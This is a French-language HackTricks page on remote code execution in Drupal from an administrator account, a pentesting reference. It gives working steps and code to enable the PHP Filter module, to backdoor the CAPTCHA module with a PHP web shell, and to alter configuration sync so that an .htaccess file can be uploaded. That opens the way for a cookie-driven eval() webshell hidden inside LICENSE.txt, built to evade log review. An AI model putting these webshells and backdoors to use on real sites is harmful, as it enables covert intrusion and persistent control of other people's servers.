# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Avec le module PHP Filter

{% hint style="warning" %}
Dans les anciennes versions de Drupal **(avant la version 8)**, il √©tait possible de se connecter en tant qu'administrateur et **d'activer le module `PHP filter`**, qui "Permet d'√©valuer le code/snippet PHP int√©gr√©." Mais √† partir de la version 8, ce module n'est pas install√© par d√©faut.
{% endhint %}

Vous devez que le **plugin php soit install√©** (v√©rifiez en acc√©dant √† _/modules/php_ et si cela renvoie un **403**, alors, **il existe**, si **non trouv√©**, alors le **plugin php n'est pas install√©**)

Allez √† _Modules_ -> (**V√©rifiez**) _PHP Filter_ -> _Sauvegarder la configuration_

![](<../../../.gitbook/assets/image (247) (1).png>)

Ensuite, cliquez sur _Ajouter du contenu_ -> S√©lectionnez _Page de base_ ou _Article_ -> √âcrivez _code shell php dans le corps_ -> S√©lectionnez _Code PHP_ dans _Format de texte_ -> S√©lectionnez _Aper√ßu_

![](<../../../.gitbook/assets/image (338).png>)

Enfin, acc√©dez simplement au n≈ìud nouvellement cr√©√© :
```bash
curl http://drupal-site.local/node/3
```
## Installer le module PHP Filter

{% hint style="warning" %}
Dans les versions actuelles, il n'est plus possible d'installer des plugins en n'ayant acc√®s qu'au web apr√®s l'installation par d√©faut.
{% endhint %}

√Ä partir de la version **8**, le **[module PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1)** **n'est pas install√© par d√©faut**. Pour tirer parti de cette fonctionnalit√©, nous devrions **installer le module nous-m√™mes**.

1. T√©l√©chargez la version la plus r√©cente du module depuis le site Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Une fois t√©l√©charg√©, allez dans **`Administration`** > **`Rapports`** > **`Mises √† jour disponibles`**.
3. Cliquez sur **`Parcourir`**, s√©lectionnez le fichier dans le r√©pertoire o√π nous l'avons t√©l√©charg√©, puis cliquez sur **`Installer`**.
4. Une fois le module install√©, nous pouvons cliquer sur **`Contenu`** et **cr√©er une nouvelle page de base**, comme nous l'avons fait dans l'exemple de Drupal 7. Encore une fois, assurez-vous de **s√©lectionner `PHP code` dans le menu d√©roulant `Format de texte`**.

## Module avec porte d√©rob√©e

{% hint style="warning" %}
Dans les versions actuelles, il n'est plus possible d'installer des plugins en n'ayant acc√®s qu'au web apr√®s l'installation par d√©faut.
{% endhint %}

Un module avec porte d√©rob√©e peut √™tre cr√©√© en **ajoutant un shell √† un module existant**. Les modules peuvent √™tre trouv√©s sur le site drupal.org. Choisissons un module tel que **[CAPTCHA](https://www.drupal.org/project/captcha)**. Faites d√©filer vers le bas et copiez le lien pour l'archive tar.gz **[archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz)**.

* T√©l√©chargez l'archive et extrayez son contenu.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Cr√©ez un **PHP web shell** avec le contenu :
```php
<?php
system($_GET["cmd"]);
?>
```
* Ensuite, nous devons cr√©er un **`.htaccess`** fichier pour nous donner acc√®s au dossier. Cela est n√©cessaire car Drupal refuse l'acc√®s direct au **`/modules`** dossier.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configuration ci-dessus appliquera des r√®gles pour le dossier / lorsque nous demandons un fichier dans /modules. Copiez ces deux fichiers dans le dossier captcha et cr√©ez une archive.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* En supposant que nous avons **un acc√®s administratif** au site web, cliquez sur **`G√©rer`** puis sur **`√âtendre`** dans la barre lat√©rale. Ensuite, cliquez sur le bouton **`+ Installer un nouveau module`**, et nous serons redirig√©s vers la page d'installation, comme `http://drupal-site.local/admin/modules/install`. Parcourez l'archive Captcha compromise et cliquez sur **`Installer`**.
* Une fois l'installation r√©ussie, parcourez **`/modules/captcha/shell.php`** pour ex√©cuter des commandes.

## Compromettre Drupal avec la synchronisation de configuration <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post partag√© par** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Partie 1 (activation de _Media_ et _Biblioth√®que de m√©dias_)

Dans le menu _√âtendre_ (/admin/modules), vous pouvez activer ce qui semble √™tre des plugins d√©j√† install√©s. Par d√©faut, les plugins _Media_ et _Biblioth√®que de m√©dias_ ne semblent pas √™tre activ√©s, alors activons-les.

Avant l'activation :

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Apr√®s l'activation :

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Partie 2 (exploitation de la fonctionnalit√© _Synchronisation de configuration_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Nous allons exploiter la fonctionnalit√© _Synchronisation de configuration_ pour extraire (exporter) et t√©l√©charger (importer) des entr√©es de configuration Drupal :

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Commen√ßons par patcher la premi√®re entr√©e `allow_insecure_uploads` de :

Fichier : system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

√Ä :

Fichier : system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

Ensuite, patcher la deuxi√®me entr√©e `file_extensions` de : 

Fichier : field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

√Ä :

Fichier : field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Je ne l'utilise pas dans ce billet de blog, mais il est not√© qu'il est possible de d√©finir l'entr√©e `file_directory` de mani√®re arbitraire et qu'elle est vuln√©rable √† une attaque par travers√©e de chemin (nous pouvons donc remonter dans l'arborescence du syst√®me de fichiers Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Partie 3 (exploitation de la fonctionnalit√© _Ajouter un document_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

La derni√®re √©tape est la plus simple et se d√©compose en deux sous-√©tapes. La premi√®re consiste √† t√©l√©charger un fichier au format .htaccess pour exploiter les directives Apache et permettre aux fichiers .txt d'√™tre interpr√©t√©s par le moteur PHP. La seconde consiste √† t√©l√©charger un fichier .txt contenant notre payload.

Fichier : .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Pourquoi ce truc est-il cool ?

Parce qu'une fois que le Webshell (que nous appellerons LICENSE.txt) est d√©pos√© sur le serveur Web, nous pouvons transmettre nos commandes via `$_COOKIE` et dans les journaux du serveur Web, cela appara√Ætra comme une requ√™te GET l√©gitime vers un fichier texte.

Pourquoi nommer notre Webshell LICENSE.txt ?

Tout simplement parce que si nous prenons le fichier suivant, par exemple [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (qui est d√©j√† pr√©sent dans le c≈ìur de Drupal), nous avons un fichier de 339 lignes et 17,6 Ko, ce qui est parfait pour ajouter un petit extrait de code PHP au milieu (puisque le fichier est suffisamment grand).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Fichier : LICENSE.txt corrig√©
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Part 3.1 (upload file .htaccess)**

Tout d'abord, nous utilisons la fonctionnalit√© _Add Document_ (/media/add/document) pour t√©l√©charger notre fichier contenant les directives Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Part 3.2 (upload file LICENSE.txt)**

Ensuite, nous utilisons √† nouveau la fonctionnalit√© _Add Document_ (/media/add/document) pour t√©l√©charger un Webshell cach√© dans un fichier de licence.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Part 4 (interaction with the Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

La derni√®re partie consiste √† interagir avec le Webshell.

Comme montr√© dans la capture d'√©cran suivante, si le cookie attendu par notre Webshell n'est pas d√©fini, nous obtenons le r√©sultat suivant lors de la consultation du fichier via un navigateur Web.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Lorsque l'attaquant d√©finit le cookie, il peut interagir avec le Webshell et ex√©cuter toutes les commandes qu'il souhaite.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Et comme vous pouvez le voir dans les journaux, il semble qu'un seul fichier txt ait √©t√© demand√©.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Merci d'avoir pris le temps de lire cet article, j'esp√®re qu'il vous aidera √† obtenir des shells.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
